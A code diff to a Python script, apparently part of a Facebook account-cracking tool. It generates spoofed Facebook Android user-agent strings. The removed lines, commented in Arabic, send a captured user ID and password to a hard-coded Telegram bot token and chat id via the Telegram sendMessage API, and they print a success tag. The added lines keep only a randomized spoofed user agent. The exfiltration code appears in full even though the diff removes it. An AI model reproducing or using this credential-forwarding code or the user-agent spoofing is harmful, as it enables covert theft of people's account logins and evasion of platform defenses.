@@ -2,39 +2,5 @@ import random
 import requests
 
 def m1():
-    user_agents = [
-        "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";FBAN/Orca-Android;FBAV/135.11.64.88;FBPN/com.facebook.orca;FBLC/en_US;FBBV/76534610;FBCR/Verizon;FBMF/Samsung;FBBD/Samsung;FBDV/GALAXY S24 ULTRA;FBSV/8.6;FBCA/arm64-v8a;FBDM/{density=1.7,width=722,height=1454};FB_FW/1;FBRV/73510054]",
-        "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";FBAN/Orca-Android;FBAV/175.51.20.93;FBPN/com.facebook.orca;FBLC/en_US;FBBV/66612199;FBCR/AT&T;FBMF/Realme;FBBD/Realme;FBDV/GALAXY S24 ULTRA;FBSV/8.3;FBCA/arm64-v8a;FBDM/{density=3.7,width=1340,height=1805};FB_FW/1;FBRV/67614694]",
-        "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";FBAN/Orca-Android;FBAV/198.25.12.73;FBPN/com.facebook.orca;FBLC/en_US;FBBV/26886376;FBCR/T-Mobile;FBMF/Samsung;FBBD/Samsung;FBDV/GALAXY S24 ULTRA;FBSV/6.5;FBCA/arm64-v8a;FBDM/{density=3.6,width=1110,height=2170};FB_FW/1;FBRV/27573586]",
-        "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";FBAN/Orca-Android;FBAV/185.40.11.2;FBPN/com.facebook.orca;FBLC/en_US;FBBV/76047433;FBCR/AT&T;FBMF/Nokia;FBBD/Nokia;FBDV/GALAXY S24 ULTRA;FBSV/5.1;FBCA/arm64-v8a;FBDM/{density=3.4,width=990,height=2549};FB_FW/1;FBRV/12283323]"
-    ]
-    return random.choice(user_agents)
-
-# معلومات الاتصال بالبوت
-bot_token = '7068886332:AAG9TK1oI7v4e1mGQood9_UZZYp1kzaJ3F8'
-chat_id = '5210419138'
-
-# توليد وكيل المستخدم عشوائيًا
-ua = m1()
-G = "\033[92m" # Green color
-W = "\033[0m" # White color
-sid = "your_sid" # Replace with your actual SID
-ps = "your_ps" # Replace with your actual password
-
-# طباعة الرسالة على وحدة التحكم
-print(f"\r{G} [JEAB-OK] {sid} [√] {ps} {W}")
-print(ua)
-
-# إرسال الرسالة إلى تلجرام
-message = f"[JEAB-OK] SID: {sid} [√] PS: {ps}\nUser Agent: {ua}"
-url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-params = {
-    'chat_id': chat_id,
-    'text': message
-}
-
-response = requests.get(url, params=params)
-if response.status_code == 200:
-    print("Message sent successfully.")
-else:
-    print("Failed to send message.")
+    ua  = "[FBAN/Orca-Android;FBAV/"+str(random.randint(196,214))+'.0.0.'+str(random.randrange(33,66))+";FBBV/"+str(random.randint(111111111,999999999))+";[FBAN/FB4A;FBAV/108.51.4.2;FBBV/53814369;FBDM/{density=2.3,width=1536,height=2048};FBLC/fr_FR;FBCR/Orange;FBMF/huawei;FBBD/huawei;FBPN/com.facebook.katana;FBDV/Huawei S-57;FBSV/4.1.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+    return ua
